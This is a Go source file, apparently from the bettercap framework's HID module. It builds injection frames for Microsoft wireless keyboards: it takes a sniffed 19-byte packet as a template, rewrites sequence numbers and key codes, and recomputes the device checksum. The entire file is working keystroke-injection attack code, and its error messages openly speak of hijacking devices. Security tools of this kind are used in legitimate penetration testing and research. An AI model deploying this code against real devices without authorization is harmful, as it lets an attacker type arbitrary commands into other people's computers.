package hid

import (
	"fmt"

	"github.com/bettercap/bettercap/network"
)

type MicrosoftBuilder struct {
	seqn uint16
}

func (b MicrosoftBuilder) frameFor(template []byte, cmd *Command) []byte {
	data := make([]byte, len(template))
	copy(data, template)

	data[4] = byte(b.seqn & 0xff)
	data[5] = byte((b.seqn >> 8) & 0xff)
	data[7] = cmd.Mode
	data[9] = cmd.HID
	// MS checksum algorithm - as per KeyKeriki paper
	sum := byte(0)
	last := len(data) - 1
	for i := 0; i < last; i++ {
		sum ^= data[i]
	}
	sum = ^sum & 0xff
	data[last] = sum

	b.seqn++

	return data
}

func (b MicrosoftBuilder) BuildFrames(dev *network.HIDDevice, commands []*Command) error {
	if dev == nil {
		return fmt.Errorf("the microsoft frame injection requires the device to be visible")
	}

	tpl := ([]byte)(nil)
	dev.EachPayload(func(p []byte) bool {
		if len(p) == 19 {
			tpl = p
			return true
		}
		return false
	})

	if tpl == nil {
		return fmt.Errorf("at least one packet of 19 bytes needed to hijack microsoft devices, try to hid.sniff the device first")
	}

	last := len(commands) - 1
	for i, cmd := range commands {
		next := (*Command)(nil)
		if i < last {
			next = commands[i+1]
		}

		if cmd.IsHID() {
			cmd.AddFrame(b.frameFor(tpl, cmd), 5)
			if next == nil || cmd.HID == next.HID || next.IsSleep() {
				cmd.AddFrame(b.frameFor(tpl, &Command{}), 0)
			}
		} else if cmd.IsSleep() {
			for i, num := 0, cmd.Sleep/10; i < num; i++ {
				cmd.AddFrame(b.frameFor(tpl, &Command{}), 0)
			}
		}
	}

	return nil
}
